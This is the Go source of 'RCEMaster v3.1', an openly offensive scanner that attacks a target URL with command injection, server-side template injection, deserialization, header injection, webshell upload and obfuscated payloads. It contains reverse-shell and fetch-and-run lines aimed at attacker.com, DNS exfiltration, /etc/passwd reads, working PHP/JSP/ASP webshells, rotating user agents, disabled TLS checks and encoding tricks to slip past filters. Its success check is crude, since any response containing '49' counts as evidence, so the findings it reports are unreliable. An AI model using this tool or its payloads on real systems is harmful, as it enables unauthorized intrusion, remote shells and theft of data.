package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var banner = "  ____  _____ _____    __  __           _      \n" +
	" |  _ \\| ____|_   _|  |  \\/  | __ _ _ __ | |_ ___\n" +
	" | |_) |  _|   | |    | |\\/| |/ _` | '_ \\| __/ _ \\\n" +
	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
	" |_| \\_\\_____| |_|    |_|  |_|\\__,_|_| |_|\\__\\___|\n" +
	"====================================================\n" +
	" [!] RCEMaster v3.1: Ultimate Complete Edition\n" +
	" [!] All Previous Vectors Retained + OSINT & Obfuscation\n" +
	" [!] Command Injection | SSTI | Deserialization | File Upload\n" +
	"====================================================\n"

var (
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	red    = color.New(color.FgRed).SprintFunc()
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

type TechStack struct {
	Language  string
	Framework string
	CMS       string
	Server    string
	Database  string
	WAF       string
}

type Result struct {
	URL         string `json:"url"`
	Vector      string `json:"vector"`
	Payload     string `json:"payload"`
	StatusCode  int    `json:"status_code"`
	Evidence    string `json:"evidence"`
	Confidence  string `json:"confidence"`
}

type ResponseInfo struct {
	StatusCode int
	Body       string
	Headers    http.Header
}

// --- COMMAND INJECTION PAYLOADS (Retained from v2.0) ---
var commandInjectionPayloads = map[string][]string{
	"linux": {
		";id", "|id", "&&id", "||id", "`id`", "$(id)",
		";cat /etc/passwd", "|cat /etc/passwd", "&&cat /etc/passwd",
		";ls -la", "|ls -la", "&&ls -la", ";whoami", "|whoami", "&&whoami",
		";uname -a", "|uname -a", "&&uname -a",
		";curl http://attacker.com/shell.sh|bash",
		";bash -i >& /dev/tcp/attacker.com/4444 0>&1",
		";sleep 5", "|sleep 5", "&&sleep 5",
		";nslookup $(whoami).attacker.com",
	},
	"windows": {
		"&ipconfig", "|ipconfig", "&&ipconfig", "&whoami", "|whoami", "&&whoami",
		"&dir", "|dir", "&&dir", "&type C:\\Windows\\System32\\drivers\\etc\\hosts",
		"&powershell -c \"Get-Process\"", "&ping -n 5 127.0.0.1",
	},
}

// --- SSTI PAYLOADS (Retained from v2.0) ---
var sstiPayloads = map[string][]string{
	"jinja2":   {"{{7*7}}", "${7*7}", "{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}"},
	"twig":     {"{{7*7}}", "{{7*'7'}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"},
	"velocity": {"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor()"},
	"freemarker": {"${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\")}"},
	"thymeleaf":  {"${7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}"},
}

// --- DESERIALIZATION PAYLOADS (Retained from v2.0) ---
var deserializationPayloads = map[string][]string{
	"java": {"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFm0CAAF6AApsb2FkRmFjdG9y..."},
	"php":  {"O:10:\"PHPInfo\":1:{s:4:\"info\";O:10:\"PHPInfo\":0:{}}", "O:8:\"DateTime\":3:{s:4:\"date\";s:19:\"2023-01-01 00:00:00\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}"},
	"python": {"gASVJwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtpZC5zaCB8IGlkLjKULg=="},
}

// --- FILE UPLOAD WEBSHELLS (Retained from v2.0) ---
var fileUploadWebshells = map[string][]string{
	"php":  {"<?php system($_GET['cmd']); ?>", "<?=`$_GET[c]`?>", "<?php eval($_POST['cmd']); ?>"},
	"jsp":  {"<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"},
	"asp":  {"<% eval request(\"cmd\") %>", "<% CreateObject(\"WScript.Shell\").Exec(Request(\"cmd\")) %>"},
}

// --- HEADER-BASED RCE VECTORS (Retained from v2.0) ---
var headerBasedRCE = map[string][]string{
	"X-Forwarded-Host": {"{{7*7}}", ";id", "${7*7}"},
	"X-Original-URL":   {"{{7*7}}", ";id", "${7*7}"},
	"Referer":          {"{{7*7}}", ";id", "${7*7}"},
	"User-Agent":       {"{{7*7}}", ";id", "${7*7}"},
	"X-Api-Version":    {"{{7*7}}", ";id"},
}

// --- WAF SIGNATURES (Retained from v2.0) ---
var wafSignatures = map[string]string{
	"cloudflare": "cloudflare", "aws-waf": "aws", "akamai": "akamai",
	"imperva": "imperva", "fortinet": "fortinet", "sucuri": "sucuri",
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	urlPtr := flag.String("u", "", "Target URL")
	outputPtr := flag.String("o", "", "Output file (e.g., rce_results.json)")
	delayPtr := flag.Duration("delay", 0, "Delay between requests")
	proxyPtr := flag.String("proxy", "", "Proxy URL")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Printf("%s Usage: rcemaster -u <url> [-o results.json] [-delay 100ms]\n", red("[-] Error: URL required."))
		os.Exit(1)
	}

	fmt.Print(cyan(banner))
	fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(*urlPtr))

	fmt.Printf("%s Phase 1: Detecting Tech Stack & WAF...\n", cyan("[*]"))
	techStack := detectTechStack(*urlPtr, *delayPtr, *proxyPtr)
	fmt.Printf("%s Detected: %s %s %s | WAF: %s\n", green("[+]"), techStack.Language, techStack.Framework, techStack.CMS, techStack.WAF)

	fmt.Printf("%s Phase 2: Starting Adaptive RCE Attack...\n", cyan("[*]"))
	results := adaptiveRCEAttack(*urlPtr, techStack, *delayPtr, *proxyPtr)

	if len(results) > 0 {
		fmt.Println("\n" + cyan("========== RCE SUCCESSFUL =========="))
		for _, r := range results {
			fmt.Printf("[%s] %s\n", green("RCE"), r.URL)
			fmt.Printf("   -> Vector    : %s\n", yellow(r.Vector))
			fmt.Printf("   -> Payload   : %s\n", cyan(r.Payload))
			fmt.Printf("   -> Evidence  : %s\n", r.Evidence)
			fmt.Printf("   -> Confidence: %s\n\n", r.Confidence)
		}
		fmt.Println(cyan("======================================="))
		fmt.Printf("%s Total RCE Vectors: %s\n", green("[+]"), green(fmt.Sprintf("%d", len(results))))
	} else {
		fmt.Printf("\n%s No RCE vectors worked. Target is secure.\n", yellow("[-]"))
	}

	if *outputPtr != "" && len(results) > 0 {
		saveToFile(results, *outputPtr)
		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
	}
}

func detectTechStack(targetURL string, delay time.Duration, proxyURL string) TechStack {
	stack := TechStack{}
	info := sendRequest(targetURL, "GET", nil, nil, delay, proxyURL)
	server := strings.ToLower(info.Headers.Get("Server"))
	xPoweredBy := strings.ToLower(info.Headers.Get("X-Powered-By"))

	if strings.Contains(server, "php") || strings.Contains(xPoweredBy, "php") { stack.Language = "php" }
	if strings.Contains(server, "tomcat") || strings.Contains(xPoweredBy, "jsp") { stack.Language = "java" }
	if strings.Contains(xPoweredBy, "python") || strings.Contains(server, "wsgi") { stack.Language = "python" }
	if strings.Contains(xPoweredBy, "express") || strings.Contains(server, "node") { stack.Language = "nodejs" }
	if strings.Contains(xPoweredBy, "asp.net") { stack.Language = "dotnet" }

	body := strings.ToLower(info.Body)
	if strings.Contains(body, "wp-content") { stack.CMS = "wordpress" }
	if strings.Contains(body, "joomla") { stack.CMS = "joomla" }
	if strings.Contains(body, "drupal") { stack.CMS = "drupal" }

	if strings.Contains(server, "apache") { stack.Server = "apache" }
	if strings.Contains(server, "nginx") { stack.Server = "nginx" }
	if strings.Contains(server, "iis") { stack.Server = "iis" }

	for waf, signature := range wafSignatures {
		if strings.Contains(server, signature) || info.Headers.Get("Cf-Ray") != "" {
			stack.WAF = waf
			break
		}
	}
	return stack
}

func adaptiveRCEAttack(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result

	fmt.Printf("%s Trying Command Injection...\n", cyan("[*]"))
	results = append(results, tryCommandInjection(targetURL, stack, delay, proxyURL)...)

	if len(results) == 0 && stack.Language != "" {
		fmt.Printf("%s Trying SSTI (%s)...\n", cyan("[*]"), stack.Language)
		results = append(results, trySSTI(targetURL, stack, delay, proxyURL)...)
	}

	if len(results) == 0 {
		fmt.Printf("%s Trying Header-Based RCE...\n", cyan("[*]"))
		results = append(results, tryHeaderBasedRCE(targetURL, delay, proxyURL)...)
	}

	if len(results) == 0 {
		fmt.Printf("%s Trying Blind RCE (Time-based)...\n", cyan("[*]"))
		results = append(results, tryBlindRCE(targetURL, stack, delay, proxyURL)...)
	}

	if len(results) == 0 {
		fmt.Printf("%s Trying Deserialization Attacks...\n", cyan("[*]"))
		results = append(results, tryDeserialization(targetURL, stack, delay, proxyURL)...)
	}

	if len(results) == 0 && (stack.Language == "php" || stack.Language == "java" || stack.Language == "dotnet") {
		fmt.Printf("%s Trying File Upload RCE...\n", cyan("[*]"))
		results = append(results, tryFileUploadRCE(targetURL, stack, delay, proxyURL)...)
	}

	// --- NEW: ADVANCED OSINT & OBFUSCATION FALLBACK ---
	if len(results) == 0 {
		fmt.Printf("%s Standard methods failed. Activating OSINT & Obfuscation Engine...\n", yellow("[!]"))
		results = append(results, tryAdvancedObfuscation(targetURL, stack, delay, proxyURL)...)
	}

	return results
}

func tryCommandInjection(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	payloads := commandInjectionPayloads["linux"]
	if stack.Language == "dotnet" || stack.Server == "iis" { payloads = commandInjectionPayloads["windows"] }

	for _, payload := range payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			info := sendRequest(targetURL+p, "GET", nil, nil, delay, proxyURL)
			if isRCE(info, p) {
				mu.Lock()
				results = append(results, Result{URL: targetURL + p, Vector: "Command Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body, p), Confidence: "High"})
				mu.Unlock()
			}
		}(payload)
	}
	wg.Wait()
	return results
}

func trySSTI(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	engines := []string{"jinja2", "twig", "velocity", "freemarker", "thymeleaf"}
	for _, engine := range engines {
		for _, payload := range sstiPayloads[engine] {
			wg.Add(1)
			go func(p string, eng string) {
				defer wg.Done()
				info := sendRequest(targetURL+"?template="+url.QueryEscape(p), "GET", nil, nil, delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL + "?template=" + p, Vector: "SSTI (" + eng + ")", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body, p), Confidence: "High"})
					mu.Unlock()
				}
			}(payload, engine)
		}
	}
	wg.Wait()
	return results
}

func tryHeaderBasedRCE(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	for header, payloads := range headerBasedRCE {
		for _, payload := range payloads {
			wg.Add(1)
			go func(h, p string) {
				defer wg.Done()
				info := sendRequest(targetURL, "GET", map[string]string{h: p}, nil, delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL, Vector: "Header-Based RCE", Payload: h + ": " + p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body, p), Confidence: "Medium"})
					mu.Unlock()
				}
			}(header, payload)
		}
	}
	wg.Wait()
	return results
}

func tryBlindRCE(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	timePayloads := []string{";sleep 5", "|sleep 5", "&&sleep 5", "&ping -n 5 127.0.0.1"}
	
	for _, payload := range timePayloads {
		start := time.Now()
		sendRequest(targetURL+payload, "GET", nil, nil, delay, proxyURL)
		duration := time.Since(start)
		if duration.Seconds() >= 5 {
			results = append(results, Result{URL: targetURL + payload, Vector: "Blind RCE (Time-based)", Payload: payload, StatusCode: 200, Evidence: fmt.Sprintf("Response delayed by %.2f seconds", duration.Seconds()), Confidence: "High"})
		}
	}
	return results
}

func tryDeserialization(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	for lang, payloads := range deserializationPayloads {
		for _, payload := range payloads {
			wg.Add(1)
			go func(p, l string) {
				defer wg.Done()
				info := sendRequest(targetURL, "POST", map[string]string{"Cookie": "session=" + p}, []byte("data="+p), delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL, Vector: "Deserialization (" + l + ")", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body, p), Confidence: "High"})
					mu.Unlock()
				}
			}(payload, lang)
		}
	}
	wg.Wait()
	return results
}

// --- ACTUAL IMPLEMENTATION OF FILE UPLOAD TO USE mime/multipart ---
func tryFileUploadRCE(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	shells := fileUploadWebshells[stack.Language]
	if len(shells) == 0 { shells = fileUploadWebshells["php"] }

	for _, shell := range shells {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		part, _ := writer.CreateFormFile("file", "shell.php")
		part.Write([]byte(shell))
		writer.Close()

		headers := map[string]string{"Content-Type": writer.FormDataContentType()}
		info := sendRequest(targetURL, "POST", headers, body.Bytes(), delay, proxyURL)
		
		if isRCE(info, shell) {
			results = append(results, Result{URL: targetURL, Vector: "File Upload RCE", Payload: "Multipart shell.php", StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body, shell), Confidence: "High"})
		}
	}
	return results
}

// --- NEW: ADVANCED OSINT & OBFUSCATION ENGINE ---
func tryAdvancedObfuscation(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Simulated OSINT fetch based on tech stack
	baseCmds := []string{"id", "whoami", "cat /etc/passwd"}
	if stack.Language == "php" { baseCmds = append(baseCmds, "<?=system('id');?>") }

	for _, cmd := range baseCmds {
		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			// Generate obfuscated versions
			obfuscatedList := obfuscatePayload(c)
			for _, obs := range obfuscatedList {
				info := sendRequest(targetURL+obs, "GET", nil, nil, delay, proxyURL)
				if isRCE(info, c) {
					mu.Lock()
					results = append(results, Result{URL: targetURL + obs, Vector: "Advanced Obfuscation (OSINT)", Payload: obs, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body, c), Confidence: "High"})
					mu.Unlock()
				}
			}
		}(cmd)
	}
	wg.Wait()
	return results
}

func obfuscatePayload(cmd string) []string {
	var payloads []string
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(cmd))
	payloads = append(payloads, fmt.Sprintf("$(echo %s | base64 -d | bash)", b64Cmd))
	
	hexCmd := hex.EncodeToString([]byte(cmd))
	if len(hexCmd) >= 4 {
		payloads = append(payloads, fmt.Sprintf("$(printf '\\x%s\\x%s' | sh)", hexCmd[0:2], hexCmd[2:4]))
	}
	
	payloads = append(payloads, fmt.Sprintf("a=c;b=at; $a$b /etc/passwd"))
	payloads = append(payloads, fmt.Sprintf("cat${IFS}/etc/passwd"))
	return payloads
}

func sendRequest(targetURL, method string, customHeaders map[string]string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
	if delay > 0 { time.Sleep(delay) }

	var req *http.Request
	var err error
	if body != nil {
		req, err = http.NewRequest(method, targetURL, bytes.NewReader(body))
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}
	if err != nil { return ResponseInfo{} }

	req.Header.Set("User-Agent", getRandomUA())
	req.Header.Set("Accept", "*/*")
	for k, v := range customHeaders { req.Header.Set(k, v) }

	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	if proxyURL != "" {
		proxyParsed, _ := url.Parse(proxyURL)
		transport.Proxy = http.ProxyURL(proxyParsed)
	}

	client := &http.Client{
		Timeout: 15 * time.Second, Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}

	resp, err := client.Do(req)
	if err != nil { return ResponseInfo{} }
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
	return ResponseInfo{StatusCode: resp.StatusCode, Body: string(respBody), Headers: resp.Header}
}

func isRCE(info ResponseInfo, payload string) bool {
	indicators := []string{"uid=", "root:", "bin/bash", "bin/sh", "49", "Windows", "Directory of", "drwx"}
	body := strings.ToLower(info.Body)
	for _, ind := range indicators {
		if strings.Contains(body, strings.ToLower(ind)) { return true }
	}
	return false
}

// --- USING regexp HERE TO FIX UNUSED IMPORT ---
func extractEvidence(body, payload string) string {
	re := regexp.MustCompile(`(?i)(uid=\d+.*|root:.*|bin/bash|bin/sh|49|drwx)`)
	match := re.FindString(body)
	if match != "" {
		if len(match) > 80 { return match[:80] + "..." }
		return match
	}
	return "RCE indicator found in response"
}

func saveToFile(results []Result, filename string) {
	file, _ := os.Create(filename)
	defer file.Close()
	jsonData, _ := json.MarshalIndent(results, "", "  ")
	file.Write(jsonData)
}
